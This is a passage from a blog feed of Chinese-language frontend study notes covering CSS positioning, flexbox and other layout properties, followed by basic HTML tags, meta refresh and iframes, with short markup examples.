id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>让盒子固定在屏幕中的某个位置</p><table><thead><tr><th>定位方式</th><th>属性值</th><th>相对于谁移动</th><th>是否占位置</th></tr></thead><tbody><tr><td>静态</td><td>static</td><td>无法通过方位属性移动</td><td>占位置</td></tr><tr><td>相对</td><td>relative</td><td>相对于自己原来的位置</td><td>是</td></tr><tr><td>绝对</td><td>absolute</td><td>相对于最近的且有定位的祖先元素</td><td>否（脱标）</td></tr><tr><td>固定</td><td>fixed</td><td>相对于浏览器可视区域</td><td>否（脱标）</td></tr></tbody></table><h3 id="元素层级关系"><a href="#元素层级关系" class="headerlink" title="元素层级关系"></a>元素层级关系</h3><h4 id="不同布局方式"><a href="#不同布局方式" class="headerlink" title="不同布局方式"></a>不同布局方式</h4><p>标准流 &lt; 浮动 &lt; 定位</p><h4 id="不同定位"><a href="#不同定位" class="headerlink" title="不同定位"></a>不同定位</h4><p>相对，绝对，固定定位默认层级相同</p><p>此时 HTML 中写在下面的元素层级更高，会覆盖上面的元素</p><h4 id="更改定位元素的层级"><a href="#更改定位元素的层级" class="headerlink" title="更改定位元素的层级"></a>更改定位元素的层级</h4><p>属性名：<code>z-index</code></p><p>属性值：数字</p><blockquote><p>数字越大，层级越高</p></blockquote><h2 id="装饰"><a href="#装饰" class="headerlink" title="装饰"></a>装饰</h2><h3 id="基线"><a href="#基线" class="headerlink" title="基线"></a>基线</h3><p>浏览器文字类型元素排版中存在用于对齐的基线（baseline），一般是指字母<code>x</code>的下边沿</p><h3 id="垂直对齐方式"><a href="#垂直对齐方式" class="headerlink" title="垂直对齐方式"></a>垂直对齐方式</h3><p>属性名：<code>vertical-align</code></p><p>属性值：</p><ul><li>baseline：基线对齐（默认）</li><li>top：</li><li>middle</li><li>bottom</li></ul><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>解决行内&#x2F;行内块元素垂直对齐问题</p><ul><li>文本框和表单按钮无法对齐问题</li><li>input 和 img 无法对齐问题</li><li>div 中的文本框，文本框无法贴顶问题</li><li>div 不设高度由 img 标签撑开，此时 img 标签下面会存在额外间隙问题</li><li>使用 line-height 让 img 标签垂直居中问题</li></ul><h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p>让某元素整体一起变透明</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">opacity</span><span class="token punctuation">:</span> 数字（0~1）<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>1：表示完全不透明</p></li><li><p>0：表示完全透明</p><blockquote><p>opacity 会让元素整体透明，包括里面的内容，如：文字、子元素等……</p></blockquote></li></ul><h3 id="精灵图"><a href="#精灵图" class="headerlink" title="精灵图"></a>精灵图</h3><p>项目中将多张小图片，合并成一张大图片，这张大图片称之为精灵图</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>减少服务器发送次数，减轻服务器的压力，提高页面加载速度</p><h4 id="使用步骤-1"><a href="#使用步骤-1" class="headerlink" title="使用步骤"></a>使用步骤</h4><ol><li>创建一个盒子</li><li>通过 PxCook 量取小图片大小，将小图片的宽高设置给盒子</li><li>将精灵图设置为盒子的背景图片</li><li>测量小图片坐标，分别取负值设置给盒子的 background-position：x y</li></ol><h2 id="CSS-书写顺序"><a href="#CSS-书写顺序" class="headerlink" title="CSS 书写顺序"></a>CSS 书写顺序</h2><p>不同的 CSS 书写顺序会影响浏览器的渲染性能，推荐前端工程师使用专业的书写顺序习惯</p><p><img src="/2023/02/20/CSS/image-20230314204846103.png" alt="image-20230314204846103"></p><blockquote><p>开发中推荐多用类 + 后代，但不是层级越多越好，一个选择器中的类选择器的个数推荐 不要超过 3 个</p></blockquote><h2 id="视口"><a href="#视口" class="headerlink" title="视口"></a>视口</h2><p>显示HTML网页的区域，用来约束HTML尺寸</p><p>默认网页宽度是980px</p><p>iPhone6&#x2F;7&#x2F;8，设备宽度375px产出设计稿，二倍图设计稿尺寸：750px。</p><h2 id="Flex布局-x2F-弹性布局："><a href="#Flex布局-x2F-弹性布局：" class="headerlink" title="Flex布局&#x2F;弹性布局："></a>Flex布局&#x2F;弹性布局：</h2><p>基于 Flex 精确灵活控制块级盒子的布局方式，避免浮动布局中脱离文档流现象发生。非常适合结构化布局</p><h3 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h3><p>父元素添加<code> display: flex</code> ，子元素可以自动的挤压或拉伸</p><h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ul><li>弹性容器</li><li>弹性盒子</li><li>主轴</li><li>交叉轴&#x2F;侧轴</li></ul><p><img src="/2023/02/20/CSS/image-20230424012454884.png" alt="image-20230424012454884"></p><h3 id="主轴对齐方式"><a href="#主轴对齐方式" class="headerlink" title="主轴对齐方式"></a>主轴对齐方式</h3><p><code>justify-content</code></p><table><thead><tr><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>flex-start</td><td>默认值，起点开始依次排列</td></tr><tr><td>flex-end</td><td>终点开始依次排列</td></tr><tr><td>center</td><td>沿主轴居中排列</td></tr><tr><td>space-around</td><td>沿主轴均匀排列，空白间距均分在盒子两侧</td></tr><tr><td>space-between</td><td>沿主轴均匀排列，空白间距均分在盒子之间</td></tr><tr><td>space-evenly</td><td>沿主轴均匀排列，空白间距处处相等（盒子与容器之间）</td></tr></tbody></table><h3 id="侧轴对齐方式"><a href="#侧轴对齐方式" class="headerlink" title="侧轴对齐方式"></a>侧轴对齐方式</h3><p><code>align-items</code>: 添加至弹性容器内</p><p><code>align-self</code>: 添加至弹性盒子</p><table><thead><tr><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>flex-start</td><td>起点开始依次排列</td></tr><tr><td>flex-end</td><td>终点开始依次排列</td></tr><tr><td>center</td><td>沿主轴居中排列</td></tr><tr><td>stretch</td><td>默认值, 弹性盒子沿着主轴线被拉伸至铺满容器</td></tr></tbody></table><h3 id="伸缩比"><a href="#伸缩比" class="headerlink" title="伸缩比"></a>伸缩比</h3><p><code>flex: 数值 </code> </p><ul><li>取值：整数</li><li>注意：只占用父盒子剩余尺寸</li></ul><h3 id="主轴方向"><a href="#主轴方向" class="headerlink" title="主轴方向"></a>主轴方向</h3><p><code>flex-direction</code></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>row</td><td>行, 水平(默认值)</td></tr><tr><td>column</td><td>列, 垂直</td></tr><tr><td>row-reverse</td><td>行, 从右向左</td></tr><tr><td>column-reverse</td><td>列, 从下向上</td></tr></tbody></table><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p><code>flex-wrap: wrap</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML</title>
      <link href="/2023/02/15/HTML/"/>
      <url>/2023/02/15/HTML/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>html 是超文本标记语言</p><ul><li><p>在纯文本编辑器中编写的内容都是纯文本,网页就是使用纯文本编写.</p></li><li><p>纯文本只能保持文本内容,图片,音频,视频等格式化的内容都不能设置.</p></li><li><p>使用标签的形式来表示网页中的不同组成部分</p></li><li><p>超文本指的是超链接</p></li></ul></li><li><p>后缀是.html 或.htm</p></li></ul><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--html5的文档声明,若不写,可能会导致浏览器页面无法正常显示--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!--根标签,一个页面有且只有一个根标签,网页的所有内容都写在根标签里 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--该标签中的内容不会在网页中显示,用于帮助浏览器解析页面--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token comment">&lt;!--meta是一个自结束标签,可以在开始标签中加一个/.此标签用来设置网页的字符集,关键字,简介等;--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--标题,搜索引擎检索时优先检索title中的内容--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--网页中所有可见的内容都在body标签中--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>这是我的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>第一个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span>网页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h5 id="标签属性-lt-font-属性名-x3D-”属性值”-属性名-x3D-”属性值”-gt-使用-CSS"><a href="#标签属性-lt-font-属性名-x3D-”属性值”-属性名-x3D-”属性值”-gt-使用-CSS" class="headerlink" title="标签属性&lt;font 属性名&#x3D;”属性值” 属性名&#x3D;”属性值”&gt; 使用 CSS"></a><del>标签属性&lt;font 属性名&#x3D;”属性值” 属性名&#x3D;”属性值”&gt;</del> <strong><em><font color="red">使用 CSS</font></em></strong></h5><p><del>可以通过属性来设置标签,在开始标签中添加属性<br>设置多个属性时,需要使用空格隔开</del></p></li><li><h5 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h5><p>一个完整的标签也可称为元素,”子元素,父元素”</p></li><li><h5 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h5><ul><li><p>编码和解码所采用的规则,称为字符集</p></li><li><p>产生乱码的根本原因是编码和解码采用的字符集不同</p></li><li><p>常见的字符集</p><ul><li>ASCII</li><li>ISO-8859_1</li><li>GBK</li><li>GB2312 中文系统的默认编码</li><li><font color='red'>UTF-8</font> 万国码,支持地球上所有的文字</li><li>ANSI 自动以系统的默认编码来保存文件</li></ul></li><li><p>在中文系统浏览器中,默认都是使用 GB2312 进行解码的</p></li></ul></li></ul><h2 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h2><ul><li><p>不区分大小写,但是一般都使用小写,</p></li><li><p>注释不能嵌套</p></li><li><p>标签必须结构完整,成对出现&#x2F;自结束标签</p></li><li><p>标签可以嵌套,但不能交叉嵌套</p></li><li><p>标签中的属性必须有值,且值必须加引号(单双都可)</p></li></ul><h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>标题标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--h1~h6六级标题标签,重要性依次降低,对于搜索引擎来说,h1重要性仅次于title,会影响到页面在搜索引擎中的排名,页面一般只能写一个h1--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>  段落标签 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>  <span class="token comment">&lt;!--在html中,字符之间所有的空格浏览器会当成一个空格解析,换行也会当成一个空格解析,可使用br标签表示换行--></span>  换行<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--使用p标签表示一个段落,p标签中的文字默认独占一行,并且段与段之间会有一个间距--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token punctuation">/></span></span><span class="token comment">&lt;!--hr标签可以在页面中生成一条水平线--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!--字体加粗--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--斜体--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>&lt;center&gt;此标签中的所有内容均会居中&lt;&#x2F;center&gt;</del></p><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>在 html 中,一些如&lt;&gt;这种的特殊字符不能直接使用的,需要使用特殊符号来表示这些特殊字符,称为实体(转义字符串)<br>浏览器解析到实体时,会自动将实体转换为其对应的字符<br>对大小写敏感</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--&amp;lt &lt;  &amp;gt >&amp;nbsp 空格&amp;copy 版权符号&amp;amp  和号&amp;quot 引号--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h2><ul><li><p>自结束标签</p></li><li><p>用来向网页中引入一个外部图片</p></li><li><p>属性</p><ul><li><p>src:设置一个外部图片的路径,目前我们所要使用的路径全都是相对路径(<em>指相对于当前资源所在目录的位置</em>).<br> 可以使用..&#x2F;来返回上一级目录</p></li><li><p>alt:可以设置在图片不能显示时,对图片的描述<br> 搜索引擎可以通过 alt 属性来识别不同的图片<br> 如果不写 alt 属性,搜索引擎不会对 img 中的图片进行收录</p></li><li><p>title:提示文本，当鼠标悬停时才显示的文本</p><blockquote><p>注意：title 属性不仅仅可以用于图片标签，还可用于其他标签</p></blockquote></li><li><p>width:可以用来修改图片的宽度,一般使用 px 作为单位</p></li><li><p>height:可以用来修改图片的高度<br> 宽度和高度两个属性如果只设置一个,另一个也会同时等比例调整大小<br>一般开发中,除了自适应的页面,不建议设置 width 和 height</p></li></ul></li><li><p>图片格式</p><ul><li>JPEG(jpg)<ul><li>支持的颜色比较多,图片可以压缩,但是不支持透明</li><li>一般使用 jpeg 来保存照片等颜色丰富的图片</li></ul></li><li>gif<ul><li>支持的颜色少,只支持简单的透明,支持动态图</li><li>图片颜色单一或颜色动图时可以使用 gif</li></ul></li><li>png<ul><li>支持的颜色多,并且支持复杂的透明</li><li>可以用来显示复杂的透明的图片</li></ul></li></ul></li><li><p>图片的使用原则</p><p>效果不一致,使用效果好的<br>效果一致,使用小的</p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>图片标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../img/2.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片描述<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100px<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相对路径:指相对于当前资源所在目录的位置</p><h2 id="音频标签"><a href="#音频标签" class="headerlink" title="音频标签"></a>音频标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./music.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>属性：<ul><li>src：音频的路径</li><li>controls：显示播放的控件</li><li>autoplay：自动播放（部分浏览器不支持）</li><li>loop：循环播放</li></ul></li></ul><h2 id="视频标签"><a href="#视频标签" class="headerlink" title="视频标签"></a>视频标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./music.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>属性：<ul><li>src：视频的路径</li><li>controls：显示播放的控件</li><li>autoplay：自动播放（谷歌浏览器中需配合 muted 实现静音播放）</li><li>loop：循环播放</li></ul></li></ul><h2 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--有序列表--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span> <span class="token attr-name">start</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>睁眼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>看手机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--无序列表--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>disc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>睁眼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>看手机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>square<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>睁眼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>看手机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>睁眼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>看手机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--自定义列表--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>主题1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>内容1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>内容2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>主题2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>内容1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>内容2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="meta-标签"><a href="#meta-标签" class="headerlink" title="meta 标签"></a>meta 标签</h2><ul><li>自结束标签</li><li>搜索引擎在检索页面时,会同时检索页面中的关键词和描述,但是这两个值不会影响页面在搜索引擎中的排名</li><li>作用<ul><li>用来设置网页的关键字</li><li>用于指定网页的描述</li><li>用来做请求的重定向&lt;meta http-equiv&#x3D;”refresh” content&#x3D;”秒数,url&#x3D;<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a> &#x2F;&gt;</li></ul></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTML5<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>发布h5,js等前端相关的信息<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5,url=http://www.baidu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架"></a>内联框架</h2><p>使用内联框架可以引入一个外部的页面,使用 iframe 来创建一个内联框架</p><p>在现实开发中不推荐使用内联框架,因为内联框架中的内容不会被搜索引擎所检索</p><ul><li>属性:<ul><li>src:指向一个外部页面的路径,可以使用相对路径</li><li>width</li><li>height</li><li>name:可以为内联框架制定一个 name 属性</li></ul></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.baidu.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token 